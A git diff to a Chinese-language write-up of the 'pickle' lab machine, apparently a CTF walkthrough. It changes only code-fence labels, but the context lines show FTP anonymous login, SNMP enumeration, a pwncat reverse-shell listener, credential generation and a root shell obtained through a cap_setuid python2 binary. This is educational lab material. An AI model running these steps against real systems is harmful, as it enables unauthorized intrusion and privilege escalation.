@@ -77,7 +77,7 @@ PORT      STATE         SERVICE      VERSION
 
 ## ftp 匿名登陆
 
-```shell
+```bash
 ftp> ls -lah
 229 Entering Extended Passive Mode (|||33958|)
 150 Here comes the directory listing.
@@ -146,7 +146,7 @@ if __name__ == '__main__':
 
 ## snmp 服务探测
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $ snmpwalk -c public -v 1 192.168.56.118 | head -n 15
 iso.3.6.1.2.1.1.1.0 = STRING: "Linux pickle 4.19.0-11-amd64 #1 SMP Debian 4.19.146-1 (2020-09-17) x86_64"
@@ -302,7 +302,7 @@ print(check_requests.text)
 
 ## User - lucas
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ pwncat-cs -lp 9999
 [15:29:38] Welcome to pwncat 🐈!
@@ -457,21 +457,21 @@ print(base64.b64encode(hashed.digest().encode("base64").rstrip("\n")))
 
 运行之后，得到
 
-```shell
+```bash
 (remote) lucas@pickle:/tmp$ python2 attck.py
 YTdYYTB1cDFQOTBmeEFwclVXZVBpTCtmakx3PQ==
 ```
 
 将用户名修改为 `mark` 之后，得到
 
-```shell
+```bash
 (remote) lucas@pickle:/tmp$ python2 attck.py
 SUk5enROY2FnUWxnV1BUWFJNNXh4amxhc00wPQ==
 ```
 
 ## User - mark
 
-```shell
+```bash
 (remote) lucas@pickle:/tmp$ su mark
 Password:
 mark@pickle:/tmp$ whoami
@@ -486,7 +486,7 @@ e25fd1b9248d1786551e3412adc74f6f
 
 ### 环境探测
 
-```shell
+```bash
 mark@pickle:~$ ls -lh
 total 3.6M
 -rwxr-xr-x 1 root root 3.6M Oct 11  2020 python2
@@ -495,7 +495,7 @@ total 3.6M
 
 可以看到这里的 `python2` 二进制文件的所有者是 `root`，但是给予了当前用户运行权限，查看文件的更多权限
 
-```shell
+```bash
 mark@pickle:~$ getcap -r ./ 2>/dev/null
 ./python2 = cap_setuid+ep
 ```
@@ -504,7 +504,7 @@ mark@pickle:~$ getcap -r ./ 2>/dev/null
 
 ## User - root
 
-```shell
+```bash
 mark@pickle:~$ ./python2 -c 'import os,pty;os.setuid(0),pty.spawn("/bin/bash")'
 root@pickle:~# whoami
 root
